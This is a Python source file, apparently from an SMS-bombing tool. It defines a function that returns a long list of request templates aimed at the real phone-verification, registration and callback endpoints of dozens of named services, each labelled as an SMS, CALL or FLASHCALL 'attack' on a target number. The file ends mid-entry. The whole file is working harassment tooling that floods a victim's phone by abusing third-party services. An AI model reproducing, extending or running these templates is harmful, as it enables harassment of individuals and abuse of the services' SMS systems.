from Core.Attack.Tools.User_Agent import user_agent

def extra_urls(number):
    """
    41 SMS-сервисов из b0mb3r-master
    """
    return [
        # Aramba
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Aramba.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://www.aramba.ru/core.php',
            'headers': user_agent()[0],
            'data': {'act': 'codeRequest', 'phone': '+' + number, 'l': 'user', 'p': 'user', 'name': 'user', 'email': 'user@gmail.com'},
        },
        # BelkaCar
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'BelkaCar.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://belkacar.ru/get-confirmation-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Citilink (phone in URL)
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Citilink.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.citilink.ru/registration/confirm/phone/+' + number + '/',
            'headers': user_agent()[0],
            'data': {},
        },
        # DoZarplati
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'DoZarplati.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://online-api.dozarplati.com/rpc',
            'headers': user_agent()[0],
            'json': {'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': number}},
        },
        # DrugVokrug
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'DrugVokrug.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://drugvokrug.ru/siteActions/processSms.htm',
            'headers': user_agent()[0],
            'data': {'cell': number},
        },
        # GorZdrav
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'GorZdrav.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://gorzdrav.org/login/register/sms/send',
            'headers': user_agent()[0],
            'data': {'phone': number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]},
        },
        # Grab
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Grab.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
            'headers': user_agent()[0],
            'data': {'phoneNumber': number, 'countryCode': number[0], 'name': 'User', 'email': 'user@gmail.com'},
        },
        # IQOS
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'IQOS.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ube.pmsm.org.ru/esb/iqos-reg/submission',
            'headers': user_agent()[0],
            'json': {'data': {'firstName': 'User', 'lastName': 'Ivanov', 'phone': number, 'email': 'user@gmail.com', 'password': 'user123', 'passwordConfirm': 'user123'}},
        },
        # Karusel
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Karusel.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.karusel.ru/api/v1/phone/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Lenta
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lenta.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lenta.com/api/v1/authentication/requestValidationCode',
            'headers': user_agent()[0],
            'json': {'phone': '+' + number},
        },
        # Maxidom
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Maxidom.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.maxidom.ru/ajax/doRegister.php',
            'headers': user_agent()[0],
            'params': {'send_code_again': 'Y', 'phone': '8(' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'email': 'user@user.com', 'code_type': 'phone'},
        },
        # McDonalds
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'McDonalds.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mcdonalds.ru/api/auth/code',
            'headers': user_agent()[0],
            'json': {'phone': '+' + number},
        },
        # MisterCat
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'MisterCat.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mistercat.com.ua/index.php',
            'headers': user_agent()[0],
            'params': {'option': 'com_ksenmart', 'view': 'profile', 'task': 'profile.sms_auth', 'tmpl': 'ksenmart'},
            'data': {'phone': number, 'type': 'send'},
        },
        # MTS TV
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MTS TV', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.mtstv.ru/v1/users',
            'headers': user_agent()[0],
            'data': {'msisdn': number},
        },
        # MVideo
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MVideo.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
            'headers': user_agent()[0],
            'params': {'pageName': 'registerPrivateUserPhoneVerification'},
            'data': {'phone': number[1:4] + '-' + number[4:-1]},
        },
        # NewNext
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'NewNext.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://newnext.ru/graphql',
            'headers': user_agent()[0],
            'json': {
                'operationName': 'registration',
                'variables': {'client': {'firstName': 'Ivan', 'lastName': 'Ivanov', 'phone': number, 'typeKeys': ['Unemployed']}},
                'query': 'mutation registration($client: ClientInput!) { registration(client: $client) { token __typename } }',
            },
        },
        # Optima (Украина)
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Optima.Taxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://online.optima.taxi/user/get-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ostin
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ostin.com', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp',
            'headers': user_agent()[0],
            'params': {'type': 'sendConfirmCode', 'phoneNumber': ' ' + number[0] + ' (' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]},
        },
        # OyoRooms
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'OyoRooms.com', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.oyorooms.com/api/pwa/generateotp',
            'headers': user_agent()[0],
            'params': {'phone': number[1:], 'country_code': '+' + number},
        },
        # PrivetMir
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PrivetMir.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-user.privetmir.ru/api/send-code',
            'headers': user_agent()[0],
            'data': {'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y', 'login': '+' + number[0] + ' (' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'scope': 'register-user'},
        },
        # PSWallet
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PSWallet.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.pswallet.ru/system/smsCode',
            'headers': user_agent()[0],
            'params': {'mobile': number, 'type': '0'},
        },
        # Rabota.ru
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rabota.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.rabota.ru/remind',
            'headers': user_agent()[0],
            'data': {'credential': number},
        },
        # RuTaxi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'RuTaxi.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://moscow.rutaxi.ru/ajax_keycode.html',
            'headers': user_agent()[0],
            'data': {'1': number},
        },
        # RuTube
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'RuTube.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://rutube.ru/api/accounts/sendpass/phone',
            'headers': user_agent()[0],
            'data': {'phone': '+' + number},
        },
        # S7 Airlines
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'S7.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.s7.ru/dotCMS/priority/ajaxEnrollment',
            'headers': user_agent()[0],
            'params': {'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': number[0], 'mobilePhone.areaCode': number[1:4], 'mobilePhone.localNumber': number[4:-1]},
        },
        # SMSint
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SMSint.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
            'headers': user_agent()[0],
            'data': {'name': 'User', 'phone': number},
        },
        # Sunlight
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sunlight.net', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.sunlight.net/v3/customers/authorization/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tanuki
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tanuki.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.tanuki.ru/...',
            'headers': user_agent()[0],
            'data': {'phone': number, 'password': '12345', 'yt0': 'Регистрация'},
        },
        # TaxiSeven
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TaxiSeven.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://taxiseven.ru/auth/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tinder
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Tinder.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
            'headers': user_agent()[0],
            'data': {'phone_number': number},
        },
        # Tinkoff
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tinkoff.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.tinkoff.ru/v1/sign_up',
            'headers': user_agent()[0],
            'data': {'phone': '+' + number},
        },
        # TotoPizza
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TotoPizza.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://totopizza.ru/gus-crystal/',
            'headers': user_agent()[0],
            'data': {'PHONE': '+' + number[0] + ' (' + number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'AUTH_FORM': 'Y', 'LOGIN': 'Продолжить'},
        },
        # URAMobil
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'URAMobil.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://service.uramobil.ru/profile/smstoken',
            'headers': user_agent()[0],
            'data': {'PhoneNumber': number},
        },
        # VoxImplant
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'VoxImplant.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-ru-manage.voximplant.com/api/SendActivationCode',
            'headers': user_agent()[0],
            'data': {'phone': number, 'account_email': 'user@gmail.com'},
        },
        # WiFi-Metro
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'WiFi-Metro.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cabinet.wi-fi.ru/api/auth/by-sms',
            'headers': {'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36', 'App-ID': 'cabinet'},
            'data': {'msisdn': number},
        },
        # Worki
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Worki.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.iconjob.co/api/web/v1/verification_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # YouDrive
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'YouDrive.today', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://youdrive.today/signup/phone',
            'headers': user_agent()[0],
            'data': {'phone': number[1:], 'phone_code': number[0]},
        },
        # Youla
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Youla.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://youla.ru/web-api/auth/request_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
    
        # FastMoney
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'FastMoney.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://fastmoney.ru/auth/registration',
            'headers': user_agent()[0],
            'data': {'RegistrationForm[username]': '+' + number, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'},
        },
        # Denga (звонок!)
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Denga.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://online.denga.ru/admin/api/json/registration',
            'headers': user_agent()[0],
            'data': {'phone': number, 'email': 'user@gmail.com', 'password': '12345678', 'passwordConfirmation': '12345678'},
        },
        # FindClone (звонок!)
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'FindClone.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://findclone.ru/register',
            'headers': user_agent()[0],
            'params': {'phone': '+' + number},
        },

    # --- Services from cludeex/spammer ---

        # 2407
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': '2407', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://2407.smartomato.ru/account/session',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Account
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Account', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://account.my.games/signup_send_sms/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.iconjob.co/api/auth/verification_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.saurisushi.ru/Sauri/api/v2/auth/login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.pozichka.ua/v1/registration/send',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.imgur.com/account/v1/phones/verify',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.hmara.tv/stable/entrance',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.eldorado.ua/v1/sign/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.easypay.ua/api/auth/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.delitime.ru/api/v2/signup',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.creditter.ru/confirm/sms/send',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.cian.ru/sms/v1/send-validation-code/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.carsmile.com/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api-prime
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api-prime', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Api-rest
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api-rest', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-rest.logistictech.ru/api/v1.1/clients/request-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # App
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'App', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.benzuber.ru/login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # App-api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'App-api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Apteka
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Apteka', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://apteka.ru/_action/auth/getForm/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Auth
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Auth', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.multiplex.ua/login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Avtobzvon
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Avtobzvon', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://avtobzvon.ru/request/makeTestCall',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # B
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'B', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://b.utair.ru/api/v1/login/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Bamper
        {
            'info': {'country': 'BY', 'attack': 'SMS', 'website': 'Bamper', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://bamper.by/registration/?step=1',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Bartokyo
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Bartokyo', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://bartokyo.ru/ajax/login.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Bluefin
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Bluefin', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://bluefin.moscow/auth/register/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Cabinet
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Cabinet', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://cabinet.planetakino.ua/service/sms',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Cinema5
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Cinema5', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cinema5.ru/api/phone_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # City24
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'City24', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://city24.ua/personalaccount/account/registration',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Client-api
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Client-api', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://client-api.sushi-master.ru/api/v1/auth/init',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Clients
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Clients', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://clients.cleversite.ru/callback/run.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Crm
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Crm', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://crm.getmancar.com.ua/api/veryfyaccount',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # E-groshi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'E-groshi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://e-groshi.com/online/reg',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Eda
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Eda', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://eda.yandex/api/v1/user/request_authentication_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Finam
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Finam', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.finam.ru/api/smslocker/sendcode',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Fix-price
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fix-price', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://fix-price.ru/ajax/register_phone_code.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Flipkart
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Flipkart
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.flipkart.com/api/6/user/signup/status',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Foodband
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Foodband', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://foodband.ru/api?call=calls',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Foodband
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Foodband', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://foodband.ru/api/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Guru
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Guru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://guru.taxi/api/v1/driver/session/verify',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Hatimaki
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Hatimaki', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.hatimaki.ru/register/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Helsi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Helsi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://helsi.me/api/healthy/accounts/login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ingos
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ingos', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Iqlab
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Iqlab', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://iqlab.com.ua/session/ajaxregister',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # It
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'It', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://it.buzzolls.ru:9995/api/v2/auth/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Izi
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://izi.ua/api/auth/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Izi
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://izi.ua/api/auth/sms-login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Kaspi
        {
            'info': {'country': 'KZ', 'attack': 'SMS', 'website': 'Kaspi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kaspi.kz/util/send-app-link',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Kilovkusa
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kilovkusa', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kilovkusa.ru/ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Koronapay
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Koronapay', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://koronapay.com/transfers/online/api/users/otps',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Lk
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lk', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lk.tabris.ru/reg/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Loany
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Loany', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://loany.com.ua/funct/ajax/registration/code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Makarolls
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Makarolls', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Makimaki
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Makimaki', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://makimaki.ru/system/callback.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Menu
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Menu', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Menu
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Menu', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.menu.ua/kiev/delivery/profile/show-verify.html',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Menza-cafe
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Menza-cafe', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://menza-cafe.ru/system/call_me.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Mobileplanet
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Mobileplanet', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mobileplanet.ua/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Moneyman
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Moneyman', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://moneyman.ru/registration_api/actions/send-confirmation-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Monobank
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Monobank', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Mos
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Mos', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Moyo
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Moyo', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.moyo.ua/identity/registration',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # My
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.modulbank.ru/api/v2/registration/nameAndPhone',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # My
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://my.mistercash.ua/ru/send/sms/registration',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # My
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.dianet.com.ua/send_sms/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Niyama
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Niyama', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Nl
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Nl', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.nl.ua',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Nn-card
        {
